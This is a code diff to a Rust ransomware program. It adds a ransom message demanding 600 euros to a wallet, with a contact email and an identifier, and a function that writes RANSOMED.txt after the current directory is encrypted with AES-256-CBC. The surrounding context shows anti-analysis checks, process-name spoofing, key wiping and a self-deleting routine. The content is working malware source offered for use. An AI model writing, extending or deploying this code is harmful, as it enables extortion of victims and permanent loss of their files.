@@ -24,6 +24,13 @@ const PROTECTED_DIRS: [&str; 6] = [
     r"C:\Temp",
 ];
 
+const ransom_msg: &str = "\
+Your files have been encrypted.\n\
+send 600 euros to this wallet: \n\
+send proof: noctol@aol.com\n\
+permanant file loss occurs after a month.\n\
+identifier: 8817728h";
+
 fn crypter_idk(data: &mut [u8], key: &[u8], iv: &[u8], encrypt: bool) -> Vec<u8> {
     let cipher = Cipher::aes_256_cbc();
     let mode = if encrypt { Mode::Encrypt } else { Mode::Decrypt };
@@ -240,6 +247,13 @@ fn spoof_process_name() {
 #[cfg(not(all(target_os = "windows", target_env = "msvc")))]
 fn spoof_process_name() {}
 
+fn ransom_note(path: &Path) -> std::io::Result<()> {
+    let ransom_path = path.join("RANSOMED.txt");
+    let mut file = File::create(ransom_path)?;
+    file.write_all(ransom_msg.as_bytes())?;
+    Ok(())
+}
+
 fn main() -> std::io::Result<()> {
     spoof_process_name();
     if check_environment() { std::process::exit(0xBEEF); }
@@ -251,6 +265,7 @@ fn main() -> std::io::Result<()> {
     let _mutated = mutation_of_flow(mutation_seed);
     let path = Path::new("./");
     dir_encryption(path, &key, &iv, mutation_seed)?;
+    ransom_note(path)?;
     let zero_key = [0xFF; KEY_SIZE];
     let zero_iv = [0xAA; BLOCK_SIZE];
     for _ in 0..3 {
@@ -261,4 +276,4 @@ fn main() -> std::io::Result<()> {
     }
     suicide()?;
     Ok(())
-}
+} // this edit includes the ransomnote
